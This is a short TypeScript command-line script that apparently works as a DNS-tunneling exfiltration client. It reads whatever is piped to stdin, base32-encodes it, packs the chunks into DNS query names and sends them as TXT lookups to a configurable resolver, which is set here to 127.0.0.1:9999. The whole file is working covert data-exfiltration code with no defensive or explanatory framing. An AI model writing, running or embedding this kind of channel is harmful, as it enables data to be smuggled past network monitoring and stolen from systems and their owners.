#!/usr/bin/env node

import { Resolver } from 'dns';
import * as base32 from 'hi-base32';
import * as fs from 'fs';

const server = {
    addr: '127.0.0.1',
    port: 9999
}

// @ts-ignore
const data: string[] = (base32.encode(fs.readFileSync(0).toString('utf8')) + '=').match(/.{1,20}/g);

const sendArr: string[] = [];

for (let i = 0; i < data.length; i += 4) {

    const row: string[] = [];

    for (let j = 0; j < 4; j++) {

        if (data[i + j]) {
            row.push(data[i + j]);
        }

    }

    sendArr.push(row.join('.'));

}

console.log(sendArr);

const resolver = new Resolver();
resolver.setServers([`${server.addr}:${server.port}`]);

function sendData(d: string | undefined) {


    if (d) {

        resolver.resolveTxt(d, (err, res) => {

            if (res[0][0] === 'OK') {

                sendData(sendArr.shift());

            } else {

                console.error(err);
                process.exit(-1);

            }

        });

    } else {

        console.log('Done');

    }

}

sendData(sendArr.shift());
